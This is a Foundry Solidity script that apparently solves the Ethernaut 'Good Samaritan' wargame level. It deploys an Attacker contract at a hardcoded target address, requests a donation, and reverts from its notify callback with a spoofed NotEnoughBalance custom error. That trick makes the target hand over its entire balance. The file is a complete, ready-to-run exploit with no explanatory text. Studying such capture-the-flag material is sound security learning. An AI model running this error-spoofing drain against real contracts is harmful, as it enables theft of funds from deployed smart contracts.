// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "../src/GoodSamaritan.sol";
import {GoodSamaritan} from "../src/GoodSamaritan.sol";
import {Script, console} from "forge-std/Script.sol";

interface IGoodSamaritan {
    function requestDonation() external returns (bool);
}

contract GoodSamaritanScript is Script {

    address public samaritan;

    function setUp() public {
        samaritan = 0x9Ba8Cf34E6c293f00AC026f437132B9F1D22420B;
    }

    function run() public {
        vm.startBroadcast();

        Attacker attacker = new Attacker(samaritan);
        attacker.attack();

        vm.stopBroadcast();
    }
}

contract Attacker is INotifyable {
    error NotEnoughBalance();

    address public target;

    constructor(address _target) {
        target = _target;
    }

    function attack() external {
        IGoodSamaritan(target).requestDonation();
    }

    function notify(uint256 amount) external override {
        if (amount == 10) {
            revert NotEnoughBalance();
        }
    }
}
